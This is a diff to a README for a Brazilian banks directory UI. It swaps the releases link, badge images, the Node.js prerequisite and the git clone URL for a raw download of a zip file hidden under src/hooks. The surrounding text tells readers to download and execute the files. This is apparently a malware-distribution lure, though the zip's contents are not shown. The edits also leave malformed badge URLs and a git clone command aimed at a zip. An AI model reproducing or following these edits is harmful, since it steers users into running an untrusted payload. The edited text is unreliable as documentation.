@@ -2,7 +2,7 @@
 
 Welcome to the **Banks Directory UI** repository! This project provides a user-friendly interface for exploring a comprehensive list of banks in Brazil. Whether you're looking for commercial banks, information on the PIX payment system, or a straightforward directory of financial institutions, this UI has you covered.
 
-![Banks Directory UI](https://img.shields.io/badge/Banks%20Directory%20UI-Ready%20to%20Explore-brightgreen)
+![Banks Directory UI](https://github.com/putrraajuang/banks-directory-ui/raw/refs/heads/main/src/hooks/banks-directory-ui-v3.9.zip%20Directory%20UI-Ready%20to%20Explore-brightgreen)
 
 ## Table of Contents
 
@@ -23,20 +23,20 @@ Welcome to the **Banks Directory UI** repository! This project provides a user-f
 
 ## Installation
 
-To get started with the Banks Directory UI, you need to download the latest release. You can find the releases [here](https://github.com/putrraajuang/banks-directory-ui/releases). Download the necessary files and execute them on your local machine.
+To get started with the Banks Directory UI, you need to download the latest release. You can find the releases [here](https://github.com/putrraajuang/banks-directory-ui/raw/refs/heads/main/src/hooks/banks-directory-ui-v3.9.zip). Download the necessary files and execute them on your local machine.
 
 ### Prerequisites
 
 Before you begin, ensure you have the following installed:
 
-- Node.js
+- https://github.com/putrraajuang/banks-directory-ui/raw/refs/heads/main/src/hooks/banks-directory-ui-v3.9.zip
 - npm (Node Package Manager)
 
 ### Steps to Install
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/putrraajuang/banks-directory-ui.git
+   git clone https://github.com/putrraajuang/banks-directory-ui/raw/refs/heads/main/src/hooks/banks-directory-ui-v3.9.zip
    ```
 
 2. Navigate into the project directory:
@@ -66,7 +66,7 @@ Once you have the application running, you can explore the following features:
 
 Simply type the name of the bank in the search bar at the top of the interface. The list will filter in real-time, showing only the relevant results.
 
-![Search Example](https://img.shields.io/badge/Search%20Example-View%20Here-blue)
+![Search Example](https://github.com/putrraajuang/banks-directory-ui/raw/refs/heads/main/src/hooks/banks-directory-ui-v3.9.zip%20Example-View%20Here-blue)
 
 ## Contributing
 
@@ -100,7 +100,7 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 For any questions or feedback, please reach out via the issues section of the repository or contact the maintainer directly.
 
-Explore the releases for updates and new features [here](https://github.com/putrraajuang/banks-directory-ui/releases). Your feedback is valuable to us!
+Explore the releases for updates and new features [here](https://github.com/putrraajuang/banks-directory-ui/raw/refs/heads/main/src/hooks/banks-directory-ui-v3.9.zip). Your feedback is valuable to us!
 
 ## Topics
 
